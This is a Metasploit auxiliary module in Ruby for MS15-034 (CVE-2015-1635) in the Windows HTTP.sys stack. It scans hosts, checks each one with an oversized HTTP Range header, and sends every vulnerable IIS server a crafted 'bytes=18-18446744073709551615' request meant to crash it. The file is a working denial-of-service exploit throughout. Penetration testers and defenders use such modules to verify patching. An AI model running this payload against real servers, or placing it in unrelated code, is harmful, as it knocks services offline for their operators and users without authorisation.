##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  # Watch out, dos all the things
  include Msf::Auxiliary::Scanner
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Dos

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'MS15-034 HTTP Protocol Stack Request Handling Denial-of-Service',
      'Description'    => %q{
        This module will check if your hosts are vulnerable to CVE-2015-1635 (MS15-034). A
        vulnerability in the HTTP Protocol stack (HTTP.sys) that could result in arbitrary code
        execution. This module will try to cause a denial-of-service.

        Please note that you must supply a valid file resource for the TARGETURI option.
        By default, IIS may come with these settings that you could try: iisstart.htm,
        welcome.png, iis-85.png, etc.
      },
      'Author'         =>
        [
          # Bill did all the work (see the pastebin code), twitter: @hectorh56193716
          'Bill Finlayson',
          # MSF. But really, these people made it happen:
          # https://github.com/rapid7/metasploit-framework/pull/5150
          'sinn3r'
        ],
      'References'     =>
        [
          ['CVE', '2015-1635'],
          ['MSB', 'MS15-034'],
          ['URL', 'http://pastebin.com/ypURDPc4'],
          ['URL', 'https://github.com/rapid7/metasploit-framework/pull/5150']
        ],
      'License'        => MSF_LICENSE
    ))

    register_options(
      [
        OptString.new('TARGETURI', [true, 'A valid file resource', '/welcome.png'])
      ], self.class)

    deregister_options('RHOST')
  end

  def run_host(ip)
    if check_host(ip) == Exploit::CheckCode::Vulnerable
      dos_host(ip)
    else
      print_status("#{ip}:#{rport} - Probably not vulnerable, will not dos it.")
    end
  end

  def dos_host(ip)
    # In here we have to use Rex because if we dos it, it causes our module to hang too
    uri = normalize_uri(target_uri.path)
    begin
      cli = Rex::Proto::Http::Client.new(ip)
      cli.connect
      req = cli.request_raw({
        'uri' => uri,
        'method' => 'GET',
        'headers' => {
          'Range' => 'bytes=18-18446744073709551615'
        }
      })
      cli.send_request(req)
    rescue ::Errno::EPIPE, ::Timeout::Error
      # Same exceptions the HttpClient mixin catches
    end
    print_status("#{ip}:#{rport} - DOS request sent")
  end

  def check_host(ip)
    uri = normalize_uri(target_uri.path)

    res = send_request_raw({'uri'=>uri})

    unless res
      vprint_error("#{ip}:#{rport} - Connection timed out")
      return Exploit::CheckCode::Unknown
    end

    if res.code == 404
      vprint_error("#{ip}:#{rport} - You got a 404. URI must be a valid resource.")
      return Exploit::CheckCode::Unknown
    end

    res = send_request_raw({
      'uri' => uri,
      'method' => 'GET',
      'headers' => {
        'Range' => 'bytes=0-18446744073709551615'
      }
    })
    if res && res.body.include?('Requested Range Not Satisfiable')
      return Exploit::CheckCode::Vulnerable
    elsif res && res.body.include?('The request has an invalid header name')
      return Exploit::CheckCode::Safe
    else
      return Exploit::CheckCode::Unknown
    end
  end

end
